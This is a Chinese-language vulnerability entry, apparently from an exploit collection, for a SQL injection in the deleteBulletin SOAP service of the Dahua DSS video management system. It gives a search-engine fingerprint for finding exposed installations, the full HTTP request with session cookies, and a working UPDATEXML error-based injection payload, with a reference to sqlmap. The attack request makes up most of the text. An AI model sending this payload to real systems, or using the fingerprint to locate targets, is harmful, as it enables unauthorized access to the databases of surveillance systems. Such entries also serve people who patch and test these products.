# 大华DSS视频管理系统deleteBulletin存在SQL注入漏洞

- **系统**：大华　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`hunter：`app.name=="Dahua 大华 DSS 视频管理系统"``
- **请求**：`POST /portal/services/itcBulletin HTTP/1.1`
- **关键头**：`Cookie: JSESSIONID=0F29FE3B0C2BF1E508A7119E327E2B44; JSESSIONID=D08F471237625640BE6F9DE6…`　`Content-Type: text/xml;charset=UTF-8`　`Content-Length: 436`

**请求体 / payload**
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:itc="http://itcbulletinservice.webservice.dssc.dahua.com">
<soapenv:Header/>
<soapenv:Body>
<itc:deleteBulletin>
<!--type: string-->
<netMarkings>(UPDATEXML(5791,CONCAT(0x2e,0x716b706a71,(SELECT (ELT(5791=5791,1))),0x716a707a71),1058))</netMarkings>
</itc:deleteBulletin>
</soapenv:Body>
</soapenv:Envelope>
qkpjq1qjpzq
sqlmap
POST /portal/services/itcBulletin HTTP/1.1
Cookie: JSESSIONID=0F29FE3B0C2BF1E508A7119E327E2B44; JSESSIONID=D08F471237625640BE6F9DE648EC1EE6
SOAPAction:
Content-Type: text/xml;charset=UTF-8
Ho…（脚本共 931 字，完整版见原文）
```

**其他**
- 大华 DSS 视频管理系统deleteBulletin存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 大华 DSS 视频管理系统